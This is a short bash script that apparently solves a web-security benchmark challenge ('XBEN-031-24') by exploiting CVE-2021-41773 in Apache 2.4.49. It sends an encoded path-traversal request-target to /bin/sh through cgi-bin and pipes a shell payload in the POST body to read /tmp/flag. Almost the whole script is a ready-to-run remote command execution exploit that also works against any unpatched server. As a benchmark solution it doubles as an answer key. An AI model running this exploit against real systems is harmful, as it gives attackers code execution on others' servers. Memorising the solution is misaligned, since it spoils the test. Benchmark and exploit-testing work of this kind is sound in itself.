#!/usr/bin/env bash
# XBEN-031-24 — "Apache CGI" (tags: command_injection, cve, path_traversal)
#
# Apache 2.4.49, CVE-2021-41773: the original of the traversal that 2.4.50 tried
# and failed to fix. Here one layer of encoding is enough --- `%2e` is `.` once
# decoded, so `.%2e/` and `%2e%2e/` are `..`, and a URL parser resolves them away
# before the request exists. That is the request h5i could not send until
# `--raw-target`: the whole subject of the test is a request-target the parser
# rewrites.
#
# mod_cgi is enabled, so the traversal that reaches `/bin/sh` runs it, with the
# POST body as its stdin. The hint is "look at /tmp", and that is where the flag
# is, so the shell script reads /tmp/flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben031-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# `..` four deep escapes /usr/local/apache2/cgi-bin to /, then bin/sh. The first
# segment is spelled `.%2e` and the rest `%2e%2e`, which is the documented shape.
TARGET='/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
PAYLOAD='echo Content-Type: text/plain; echo; cat /tmp/flag'

"$H5I" browser open "$URL" --session "$SESSION" --new --capture >/dev/null

SEQ="$("$H5I" browser resend 0 \
    --raw-target "$TARGET" \
    --set method=POST \
    --set "body.raw=$PAYLOAD" \
    --session "$SESSION" --json |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

"$H5I" websec match "res_$SEQ" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
